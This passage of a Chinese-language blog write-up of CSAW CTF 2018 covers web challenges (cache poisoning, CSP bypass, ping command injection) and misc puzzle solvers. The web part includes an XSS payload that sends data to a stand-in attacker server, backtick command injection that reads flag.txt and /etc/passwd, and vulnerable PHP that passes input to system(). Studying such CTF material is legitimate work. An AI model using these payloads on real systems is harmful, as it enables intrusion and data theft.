requests.get(&quot;http://4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/app.js&quot;, headers=&#123;&apos;X-Forwarded-Host&apos;: X_Forwarded_Host&#125;)</span><br><span class="line">    print resp.headers</span><br><span class="line">    if X_Forwarded_Host in resp.text:</span><br><span class="line">        print resp.text</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537351113421.png" alt="1537351113421"></p><p>得到的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">var token = null;</span><br><span class="line"></span><br><span class="line">Promise.all([</span><br><span class="line">    fetch('/api/movies').then(r=&gt;r.json()),</span><br><span class="line">    fetch(`//1.2.3.4/cdn/main.mst`).then(r=&gt;r.text()),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.loaded_recapcha === true)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        window.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.loaded_mustache === true)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        window.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(([user, view])=&gt;&#123;</span><br><span class="line">    document.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(document.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: t=&gt; &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            document.getElementById(<span class="string">'report'</span>).disabled = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    let hidden = true;</span><br><span class="line">    document.getElementById('report').onclick = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          document.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          document.getElementById(<span class="string">'report'</span>).disabled = true;</span><br><span class="line">          hidden = false;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: JSON.stringify(&#123;token:token&#125;)</span><br><span class="line">        &#125;).then(r=&gt;r.json()).then(j=&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                // The admin <span class="keyword">is</span> on her way to check the page</span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>em~</p><p>然后通过<code>web缓存污染</code>劫持了模板文件。接着我们再构造好模板文件，然后让<code>admin</code>去访问就可以拿到<code>flag</code>了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;header&quot;&gt;</span><br><span class="line">Hacker Movie Club</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;header admin&quot;&gt;</span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;table class=&quot;movies&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line"> &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line"></span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;captcha&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;fetch(&apos;http://my_server_ip/&apos;+&apos;&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>它要求服务器回应的头信息要包含<code>Access-Control-Allow-Origin</code>字段，如果你不想配置Apache或者Nginx，那你可以使用下面这个建议的python web server。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    # Python 3</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="keyword">as</span> test_orig</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    def test (*args):</span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">8000</span>)</span><br><span class="line">except ImportError: # Python 2</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="keyword">from</span> SimpleHTTPServer <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">class CORSRequestHandler (SimpleHTTPRequestHandler):</span><br><span class="line">    def end_headers (self):</span><br><span class="line">        self.send_header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure><p>开启后就能在日志输出中得到<code>flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}</code></p><h5 id="No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）"><a href="#No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）" class="headerlink" title="No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）"></a>No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）</h5><p><code>No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.</code></p><p><code>Be #unhackable.™</code></p><p><code>http://no.vulnerable.services/</code></p><p>此题没做出来，稍显复杂，先扔个<a href="https://ctftime.org/writeup/11205" target="_blank" rel="noopener">writeup</a>，然后复现一遍</p><p>首先用这个<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">CSP检测工具</a>检验CSP，检验结果如下图：</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365900771.png" alt="1537365900771"></p><p>发现<code>script-src</code>可能存在问题，但题目环境中我们并没有能够控制<code>src</code>的地方，所以再回头看看还有什么发现。</p><p>页面的最底下发现了一个奇怪的域名</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365952852.png" alt="1537365952852"></p><p>我们<code>ping</code>一下<code>no.vulnerable.services</code>发现解析地址是：<code>216.165.2.40</code>，16进制表示就是<code>0xd8a50228</code>。</p><p>由于CSP中存在<code>script-src *.no.vulnerable.services</code>，通过代理，我们可以绕过这一层。但是如何挂上代理呢？这里还有有一个点就是我们能提交网站内容供他们检查，他们会使用<code>bot</code>去模拟访问。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433319556.png" alt="1537433319556"></p><p>提交之后，得到了<code>cookie=PHPSESSID=9evknkhr4lfb2oii4h2k71ulac</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433181250.png" alt="1537433181250"></p><p>但是这里我尝试使用这里的cookie访问<code>http://admin.no.vulnerable.services</code>，都是需要账号和密码的，完全复现不出以下页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;NVS INTERNAL - Admin&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p&gt;Current Visitors: 672&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Quick links:&lt;/p&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;//support.no.vulnerable.services&quot;&gt;Support&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;lb.php&quot;&gt;Load Balancers - BETA&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>以下是我尝试的两个页面截图，第二个页面还是重定向到了<code>login.php</code>去了</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406529974.png" alt="1537406529974"></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406731871.png" alt="1537406731871"></p><p>下面这句话我没搞懂，是我太菜了？还请大佬们教教我</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433574609.png" alt="1537433574609"></p><p>额，假设我复现出以上页面，使用这个<code>cookie</code>的成功访问<code>http://admin.no.vulnerable.services</code>，我们将看到<code>admin.no.vulnerable.services/lb.php</code>与<code>support.no.vulnerable.services</code>。</p><p>查看其中<code>lb.php</code>，其实是一个负载均衡的监视器：</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433252118.png" alt="1537433252118"></p><p>在<code>lb.php</code>，我们可以找到<code>216.165.2.41</code>，但无法访问。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433820630.png" alt="1537433820630"></p><p>如果我们将<code>Host</code>更改为<code>support.no.vulnerable.services</code>，则会返回<code>Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.</code>。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406901499.png" alt="1537406901499"></p><p>这是因为<code>216.165.2.41</code>是代理，所以我们可以按照上面的格式将<code>Host</code>改为<code>{hexip}.ip.no.vulnerable.service</code>。但怎么知道<code>ip</code>呢？我们<code>ping</code> 下<code>support.no.vulnerable.services</code>，知道它的<code>ip</code>是<code>172.16.2.5</code>，而<code>172.16.2.5</code>的<code>16</code>进制值为<code>ac100205</code>，所以我们可以使用<code>ac100205.ip.no.vulnerable.services</code>它来访问它。（这个<a href="https://www.browserling.com/tools/ip-to-hex" target="_blank" rel="noopener">网站</a>将<code>ip</code>值转化为<code>16</code>进制值）</p><p>构造完，我们访问下，得到如下页面，可以看到有个ping.php</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407249656.png" alt="1537407249656"></p><p>这个页面是可以进行<code>ping</code>，看来它是一个<code>ping</code>命令行注入。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407286715.png" alt="1537407286715"></p><p>尝试下（注意<code>Host</code>头部均要改成<code>Host: ac100205.ip.no.vulnerable.services</code>）</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407427066.png" alt="1537407427066"></p><p>尝试<code>ls</code>一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?dest=127.0.0.`ls`</span><br></pre></td></tr></table></figure><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407642085.png" alt="1537407642085"></p><p>读取<code>flag.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?dest=127.0.0.1`cat%20flag.txt`</span><br></pre></td></tr></table></figure><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407992506.png" alt="1537407992506"></p><p>得到<code>flag{7672f158167cab32aebc161abe0fbfcaee2868c1}</code></p><p>后面尝试读取其他文件，比如<code>ping.php</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408264849.png" alt="1537408264849"></p><p>以下是此源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'dest'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Missing parameters."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dest = $_GET[<span class="string">'dest'</span>];</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c3 \""</span> . $dest . <span class="string">"\" 2&gt;&amp;1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>又如<code>/etc/passwd</code>…….其他自行摸索篇</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408363301.png" alt="1537408363301"></p><h5 id="WTF-SQL（没搞懂考的啥——此题未解决）"><a href="#WTF-SQL（没搞懂考的啥——此题未解决）" class="headerlink" title="WTF.SQL（没搞懂考的啥——此题未解决）"></a>WTF.SQL（没搞懂考的啥——此题未解决）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">         C S A W</span><br><span class="line">          C T F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">It is a period of civil war.</span><br><span class="line">Rebel hackers, striking</span><br><span class="line">from a hidden base, have won</span><br><span class="line">their first victory against</span><br><span class="line">the evil DBA.</span><br><span class="line"></span><br><span class="line">During the battle, Rebel</span><br><span class="line">spies managed to steal secret</span><br><span class="line">plans to the DBA&apos;s</span><br><span class="line">ultimate weapon, WTF.SQL,</span><br><span class="line">an integrated framework</span><br><span class="line">with enough buzzwords to</span><br><span class="line">host an entire website.</span><br><span class="line"></span><br><span class="line">Pursued by the DBA&apos;s</span><br><span class="line">sinister agents, You, the</span><br><span class="line">Player, race home aboard</span><br><span class="line">your VT100, custodian of the</span><br><span class="line">stolen schema that can save</span><br><span class="line">the animals and restore</span><br><span class="line">freedom to the internet.....</span><br><span class="line"></span><br><span class="line">Your mission is to read out</span><br><span class="line">the txt table in the flag</span><br><span class="line">database.</span><br></pre></td></tr></table></figure><p><code>Enjoy :&gt;</code></p><p><code>Edit: (09/15 11:06 AM EST) Fixed a bug in stage 2</code></p><p><code>http://web.chal.csaw.io:3306</code></p><p>此题先放出<a href="https://blog.rpis.ec/2018/09/csaw-ctf-quals-2018-wtf-sql.html" target="_blank" rel="noopener">writeup</a></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Twitch-Plays-Test-Flag（签到题）"><a href="#Twitch-Plays-Test-Flag（签到题）" class="headerlink" title="Twitch Plays Test Flag（签到题）"></a>Twitch Plays Test Flag（签到题）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;typ3_y3s_to_c0nt1nue&#125;</span><br></pre></td></tr></table></figure><h5 id="bin-t"><a href="#bin-t" class="headerlink" title="bin_t"></a>bin_t</h5><p>Binary trees let you do some interesting things. Can you balance a tree?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9001</span><br></pre></td></tr></table></figure><p>Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.</p><p><code>nc</code>下给出一组数字，将这组数字转换成<code>平衡二叉树</code>，并且给出该ACL树的前序遍历。</p><p><code>Add these numbers to a AVL Binary Tree, then send them back in the preorder traversal!</code><br><code>99,5,76,16,73,65,45,48,52,81,99,38,16,83,91,20,40,35,41,94,26,40,53,89,93,43,27,49,3,87,98,48,38,64,78,44,81,22,28,35,29,51,63,87,55,99,78,34,47,0,98,54,88,55,81,66,60,40,23,78,70,74,83,98,38,24,29,4,64,65,49,46,46,10,22,98,35,55,73,16,83,86,21,99,78,56,31,6,77,83,81,69,63,77,26,31,20,81,76,8</code><br><code>Send the preorder traversal in a comma sperated list.</code></p><p>对于我这种菜鸡而言，还是有点难度的，直接<code>github</code>找了下，调用<code>pyavltree</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pyavltree <span class="keyword">import</span> AVLTree</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9001</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">numbers = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> r.recvline().split(<span class="string">","</span>)]</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">tree = AVLTree(numbers)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">","</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> tree.preorder(tree.rootNode)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537435410792.png" alt="1537435410792"></p><p>不过这样的做法是学不到东西的，还是得回头学。</p><h5 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h5><p>Start from the monkey’s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</p><ul><li>Elyk</li></ul><p>Hint: There are 112 Things You Need to Worry About</p><p><a href="https://ctf.csaw.io/files/cdd260cc2b42696bff30d001b85aed06/20180915_074129.jpg" target="_blank" rel="noopener">20180915_074129.jpg</a></p><p>这题是我见过最恐怖的misc题，正确做法如下</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/6.png" alt="6"></p><p>上面那个看不懂，再看下面的</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/short-circuit.jpg" alt="short-circuit"></p><p>然后拼接</p><p><code>01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001</code><br><code>01101000 01100001 01101110 01100100 01111101</code></p><p>转换得到<code>flag</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537436074257.png" alt="1537436074257"></p><p>此题有非常详细的<a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CSAWCTFQualificationRound2018#short-circuit" target="_blank" rel="noopener">writeup</a>，可以仔细学习到很多东西</p><h5 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h5><p>Are you a real math wiz?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9002</span><br></pre></td></tr></table></figure><p>这题不难，自己用<code>pwntools</code>写出来了，不过无意间看了大佬的简易代码，运用<a href="https://code.activestate.com/recipes/365013-linear-equations-solver-in-3-lines/" target="_blank" rel="noopener">复数的姿势</a>，稍微修改了下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">sc=socket.socket()</span><br><span class="line">host = &quot;misc.chal.csaw.io&quot;</span><br><span class="line">port =9002</span><br><span class="line">addr=(host,port)</span><br><span class="line">sc.connect(addr)</span><br><span class="line">print sc.recv(2048)</span><br><span class="line"></span><br><span class="line">def solve1(eq,var=&apos;X&apos;):</span><br><span class="line">    eq1 = eq.replace(&quot;=&quot;,&quot;-(&quot;) + &quot;)&quot;</span><br><span class="line">    print eq1</span><br><span class="line">    c = eval(eq1,&#123;var:1j&#125;)</span><br><span class="line">    print c</span><br><span class="line">    print c.real,c.imag</span><br><span class="line">    if (-c.real == 0):</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return -c.real/c.imag</span><br><span class="line"></span><br><span class="line">def find(num):</span><br><span class="line">    print &apos;============  &apos; + str(num) + &apos;  ===============&apos;</span><br><span class="line">    data = sc.recv(1024)</span><br><span class="line">    if &quot;flag&quot; in data:</span><br><span class="line">        print data</span><br><span class="line">        return 1</span><br><span class="line">    if num!=1:</span><br><span class="line">        equation = data.split(&apos;\n&apos;)[1]</span><br><span class="line">    else:</span><br><span class="line">        equation = data.split(&apos;\n&apos;)[0]</span><br><span class="line">    print equation</span><br><span class="line">    result = str(solve1(equation))</span><br><span class="line">    print &apos;solving：&apos; + equation + &apos;, result = &apos; + result</span><br><span class="line">    sc.send(result + &apos;\n&apos;)</span><br><span class="line">    print &apos;===========================&apos;</span><br><span class="line"></span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while True:</span><br><span class="line">    if find(i):</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br></pre></td></tr></table></figure><p>运行得到<code>flag</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537438355628.png" alt="1537438355628"></p><p>最终答案<code>flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</code></p><p><code>pwntools</code>使用的源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Skip the banner</span></span><br><span class="line">r.recvuntil(<span class="string">"*********"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    task = r.recvline()</span><br><span class="line">    <span class="keyword">print</span> task</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">"What does X equal?: "</span>)</span><br><span class="line"></span><br><span class="line">    eq1 = task.replace(<span class="string">"="</span>,<span class="string">"-("</span>)+<span class="string">")"</span></span><br><span class="line">    c = eval(eq1,&#123;<span class="string">"X"</span>:<span class="number">1j</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return 0 by default = if infinite solutions</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> c.imag != <span class="number">0</span>:</span><br><span class="line">        result = -c.real/c.imag</span><br><span class="line"></span><br><span class="line">    r.sendline(str(result))</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br></pre></td></tr></table></figure><h5 id="Take-an-L"><a href="#Take-an-L" class="headerlink" title="Take an L"></a>Take an L</h5><p>Fill the grid with L’s but avoid the marked spot for the W</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9000</span><br></pre></td></tr></table></figure><p>The origin is at (0,0) on the top left</p><p><a href="https://ctf.csaw.io/files/08e3f77b27de5e821d109c5b329133aa/description.pdf" target="_blank" rel="noopener">description.pdf</a></p><p>此题，对于菜鸡而言不是现在能解决的，我放弃，放出<a href="https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#take-an-l-200-misc" target="_blank" rel="noopener">writeup</a></p><h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="simple-recovery"><a href="#simple-recovery" class="headerlink" 